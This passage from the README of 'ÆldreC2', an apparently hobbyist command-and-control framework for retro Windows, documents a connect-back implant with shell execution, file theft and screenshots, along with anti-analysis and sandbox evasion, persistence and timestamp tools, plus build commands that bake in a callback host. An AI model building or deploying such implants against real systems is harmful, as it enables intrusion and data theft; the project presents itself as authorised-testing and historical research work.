| **Tank (Win16)** | `windows/tank16.c` | Connect-back implant for Windows 3.1/WFW without Win32s. Commands: sysinfo, ls, get, put, env, ps, kill, pinfo, resolve, ifconfig, screenshot, shell exec. 16-bit Winsock via dynamic WINSOCK.DLL load. CLU patchable. |
| **CLU** | `windows/clu.c` | Win32 GUI generator. Scans template binary for magic `AELDRECLU0001`, patches host/port/tls in-place. Browse dialogs for template and output. |
| **Recognizer** | `windows/recognizer.c` | Anti-analysis module. Inactive stub by default; activate with `-DRECOGNIZER_ENABLE`. Checks: IsDebuggerPresent, VMware/VBox/VirtualPC registry keys, sandbox usernames, timing. |
| **ncwfw** | `windows/ncwfw.c` | MDI netcat (TCP + optional TLS). Standalone test/debug tool. |
| **Grid** | `windows/grid.c` | Win32s/Win32 port scanner. GUI subsystem, async select-pool (no threads), Winsock 1.1. CIDR/range targets, per-port service lookup from SERVICES.DAT, optional banner grab, tab-delimited parseable output when redirected, results window on Win32s. |
| **ipcalc32** | `windows/ipcalc.c` | Win32s/Win32 subnet calculator. Network/broadcast/host range, class, RFC 1918 / APIPA / multicast flags. CLI-scriptable; `-o file` writes results to disk; stdout when redirected. |
| **ipcalc16** | `windows/ipcalc.c` | Win16 subnet calculator (same source as ipcalc32). Runs on Windows 3.1 / WFW 3.11. Identical CLI and output. |
| **markuped** | `windows/markuped.c` | Win32s/Win32 Markdown editor. Split-pane (source + live preview), toolbar, menus, inline bold/italic/code rendering, fenced code blocks, blockquotes, lists, HR. Draggable splitter, 500 ms debounced refresh. comdlg32 for file dialogs. |
| **wget** | `windows/wget.c` | Win32s/Win32 HTTP/HTTPS/FTP downloader. WinInet dynamically loaded for HTTPS/FTP (ignores SSL errors); raw socket fallback for plain HTTP when WinInet absent. GUI progress window or stderr progress in console mode. |
| **wget16** | `windows/wget.c` | Win16 HTTP downloader (same source as wget). WINSOCK.DLL loaded dynamically. HTTP only; no HTTPS/FTP. GUI MessageBox completion notification. |
| **jloshtog** | `windows/jloshtog.c` | Win32s/Win32 Joshua log viewer. Filter by tanks/operators, word-wrap, auto-locates `joshua.log` next to the binary. F5 reload. |
| **dumont** | `windows/dumont.c` | Win32 network mapper. Reads grid TSV output, renders scrollable node map with subnet grouping, zoom, service labels. Accepts piped stdin. Auto-launched by Joshua after `/scansubnet`. |

### Icons

All icons are 32×32 + 16×16, 4bpp Windows VGA palette, generated from `icons/` via `icons/win16ico.py` (Python 3 + Pillow).

To regenerate after changing a source image:
```sh
python3 icons/win16ico.py icons/<name>.png windows/<name>.ico
```

---

#### ÆldreC2 Icon Gallery

| Icon | Tool · Description | Reason for Icon |
|:----:|-------------------|-----------------|
| <img src="icons/joshua.png" width="48" alt="joshua"> | **`joshua.exe`** — C2 controller (MDI, multi-session) | |
| <img src="icons/TANK.webp" width="48" alt="tank"> | **`tank.exe`** · **`tank16.exe`** — Connect-back implant | |
| <img src="icons/lightman.png" width="48" alt="lightman"> | **`lightman.exe`** — CLI operator client | |
| <img src="icons/flynn.png" width="48" alt="flynn"> | **`flynn.exe`** — GUI operator client (two-pane) | |
| <img src="icons/LIGHTCYCLE.PNG" width="48" alt="clu"> | **`clu.exe`** — Implant generator / binary patcher | |
| <img src="icons/RECO.webp" width="48" alt="recognizer"> | **Recognizer module** — Anti-analysis stub | |
| | | |
| <img src="icons/grid.png" width="48" alt="grid"> | **`grid.exe`** — TCP port scanner (GUI, colour themes) | |
| <img src="icons/gridcli.png" width="48" alt="gridcli"> | **`gridcli.exe`** — TCP port scanner (console, command.com) | |
| <img src="icons/WOPR.jpg" width="48" alt="ncwfw"> | **`ncwfw.exe`** — Netcat for WFW (tabbed MDI, Win16) | |
| <img src="icons/ncnt.png" width="48" alt="ncnt"> | **`ncnt.exe`** — Netcat for NT (console, Weld Pond tribute) | |
| <img src="icons/arp.png" width="48" alt="arp"> | **`arp.exe`** — ARP table viewer + ICMP ping sweep | |
| <img src="icons/stager.png" width="48" alt="stager"> | **`stager.exe`** — HTTP file staging server | |
| | | |
| <img src="icons/ipcalc.png" width="48" alt="ipcalc"> | **`ipcalc32.exe`** · **`ipcalc16.exe`** — Subnet calculator | |
| <img src="icons/wget.png" width="48" alt="wget"> | **`wget.exe`** · **`wget16.exe`** — HTTP/HTTPS/FTP downloader | |
| <img src="icons/markuped.png" width="48" alt="markuped"> | **`markuped.exe`** — Markdown editor (split-pane, live preview) | |
| <img src="icons/svcany.png" width="48" alt="svcany"> | **`svcany.exe`** — NT service installer + autorun persistence | |
| <img src="icons/regcli.png" width="48" alt="regcli"> | **`regcli.exe`** — CLI registry tool for NT 3.x / 4.0 | |
| <img src="icons/whoami.png" width="48" alt="whoami"> | **`whoami.exe`** — Identity / SID / groups for pre-XP NT | |
| <img src="icons/clip.png" width="48" alt="clip"> | **`clip.exe`** — Clipboard read / write from command line | |
| <img src="icons/timestmp.png" width="48" alt="timestmp"> | **`timestmp.exe`** — File timestamp copy and set | |
| | | |
| <img src="icons/yori.png" width="48" alt="yori"> | **`yori16.exe`** · **`yori32.exe`** — Remote screen/control server | |
| <img src="icons/yoriview.png" width="48" alt="yoriview"> | **`yoriview.exe`** — Remote screen viewer · codename **THE\_UNIVERSAL** | |

---

## Localisation

All user-visible strings are in `windows/strings_<lang>.rc` files.  The runtime language is chosen at startup via `GetUserDefaultLangID()` with a fallback to British English.

| File | Language | LANGID |
|------|----------|--------|
| `strings_en_gb.rc` | English (British) — default | 0x0809 |
| `strings_en_us.rc` | English (United States) | 0x0409 |
| `strings_da.rc` | Dansk | 0x0406 |
| `strings_de.rc` | Deutsch | 0x0407 |

To add a language: copy `strings_en_gb.rc`, translate all strings, add a block for the new LANGID in `lang_detect()` in `lang.h`.

---

## Win32s

Win32s is required to run Win32 tools on Windows 3.11 / WFW 3.11.

```sh
./fetch-win32s.sh   # downloads pw1232.exe (Win32s 1.30c redistributable)
```

The setup installer (`setup16.exe`) probes for Win32s at startup and warns if absent.

The Win32s distribution installer (`setup32.exe`) is built with InnoSetup 1.2.16 **16-bit edition** — the installer itself is a Win16 NE executable and **requires no prerequisites** to run on any supported platform (Windows 3.1x, WFW 3.11, Win32s, Win95, NT 3.x/4.x). The Win32 tools it installs require Win32s on Windows 3.11; install Win32s via `pw1232.exe` from `fetch-win32s.sh` before using the installed tools.

---

## Testing

```sh
pip install pytest requests
```

Tests live in `tests/`. Wine is required for the Wine-dependent tests; they auto-skip if `wine` is not in PATH.

```sh
# Run everything that doesn't need a live C2 build
pytest tests/ -v

# Run the full C2 protocol suite (needs Docker + Wine)
C2_INTEGRATION=1 pytest tests/test_c2_protocol.py -v
```

| Test file | What it covers |
|-----------|----------------|
| `test_ipcalc.py` | ipcalc32.exe — subnet calculation output, flags (APIPA, RFC 1918, multicast), file output, dotted-mask input |
| `test_grid.py` | grid.exe — open/closed port detection, TSV output format, banner grab, `-t`/`-T` flags |
| `test_wget.py` | wget.exe — HTTP download, `-O` filename, `-q` quiet mode, binary integrity, large payloads, connection-refused exit code |
| `test_clu.py` | CLU magic signature in tank.exe/tank16.exe, config block round-trip patch, NE/PE binary format checks, GUI smoke test |
| `test_c2_protocol.py` | Tank→Joshua TCP connection, initial SYSINFO message, binary format assertions (NE/PE headers). Integration tests gated on `C2_INTEGRATION=1`. |

---

## Building

### Prerequisites

- **OpenWatcom 2.0** — provides `wcl386` (Win32), `wcc` (Win16), `wlink`, `wrc`
- **i686-w64-mingw32-windres** — for `.rc` resource compilation
- The repo includes a Docker image `aeldrec2-builder` with all tools pre-installed

### Docker build (recommended)

```bat
cd windows
docker run --rm -v "%CD%:/src" aeldrec2-builder wmake -f Makefile.wc joshua
docker run --rm -v "%CD%:/src" aeldrec2-builder wmake -f Makefile.wc tank
docker run --rm -v "%CD%:/src" aeldrec2-builder wmake -f Makefile.wc tank16
docker run --rm -v "%CD%:/src" aeldrec2-builder wmake -f Makefile.wc clu
```

On macOS/Linux replace `%CD%` with `$(pwd)`.

### Standalone C2 tools only (skip PuTTY objects)

```bat
wmake -f Makefile.wc joshua
wmake -f Makefile.wc tank
wmake -f Makefile.wc tank16
wmake -f Makefile.wc clu
wmake -f Makefile.wc ncwfw
```

### Override C2 callback address and key at compile time

No shell quoting needed — pass the IP and key bare, without quotes:

```bash
# Via build script (recommended)
C2HOST=172.16.93.1 C2PORT=443 ./build-c2.sh tank

# Via wmake directly
wmake -f Makefile.wc tank.exe XFLAGS=-DTANK_C2_HOST=172.16.93.1
wmake -f Makefile.wc tank.exe XFLAGS="-DTANK_C2_HOST=172.16.93.1 -DTANK_C2_PORT=443"

# Bake host, port and key (use CLU instead for per-engagement patching)
wmake -f Makefile.wc tank.exe XFLAGS="-DTANK_C2_HOST=172.16.93.1 -DTANK_C2_PORT=4444 -DTANK_C2_KEY=A3F7B291"
```

The default key `00000000` will not match any real Joshua session — tanks built without patching will be rejected on connect. Use CLU to patch the key after starting Joshua.

The source uses `#`-stringification (`TANK_STR(x)`) so the IP is converted to a
string literal by the preprocessor. This avoids the shell-quoting nightmare that
comes with trying to pass `"x.x.x.x"` through wmake macro expansion.

The default in the source is `127.0.0.1` — use CLU to patch a deployed binary
rather than rebuilding with a hardcoded address for each engagement.

### Enable Recognizer (anti-analysis) in Tank

```bash
RECOGNIZER=1 ./build-c2.sh tank
# or
wmake -f Makefile.wc tank.exe XFLAGS=-DRECOGNIZER_ENABLE
```

---

## Testing

### Basic loopback test (same machine)

1. Start **Joshua.exe** — it immediately listens on TCP 4444
2. Run **Tank.exe** (built with default `127.0.0.1:4444`) on the same machine
3. Joshua shows a new MDI child: `Tank: <hostname> <OS> [ready]` and the session list on the left updates
4. Use the **Tank** menu: Sysinfo, Process List, Directory Listing, Get File, Put File, Screenshot

### Patching with CLU

1. Build `tank.exe` with default config (127.0.0.1:4444)
2. Run **clu.exe**, browse to `tank.exe` as template
3. Enter real C2 host/port, optionally tick TLS
4. Click **Generate** → patched binary ready for deployment

### Win16 Tank (tank16.exe)

Runs on Windows 3.1 or WFW 3.11. Requires `WINSOCK.DLL` (Trumpet Winsock or equivalent) in the path. Calls back to the same Joshua controller — the protocol is identical.

### Protocol summary

| Direction | Message | Meaning |
|-----------|---------|---------|
| Tank → Joshua | `Tank/1 host=X os=Y shell=Z key=XXXXXXXX\n` | Banner on connect (key must match Joshua server key) |
| Joshua → Tank | `sysinfo\r\n` etc. | Command |
| Tank → Joshua | text lines | Command output |
| Tank → Joshua | `FILE:<n>\n` + n bytes | File transfer (get/screenshot) |
| Joshua → Tank | `put <path>\r\n` | Initiate upload |
| Tank → Joshua | `PUTREADY\n` | Ready to receive |
| Joshua → Tank | `PUTSIZE:<n>\n` + n bytes | File data |
| Tank → Joshua | `<<<DONE>>>\n` | End of response |
| Tank → Joshua | `<<<WATCH_TICK>>>\n` | Watch iteration boundary (cmd slot stays open) |

---

## Disclaimer

ÆldreC2 is an educational and research project intended for authorised administration, testing, and historical computing experimentation.

Users are responsible for ensuring compliance with all applicable laws, regulations, and policies.
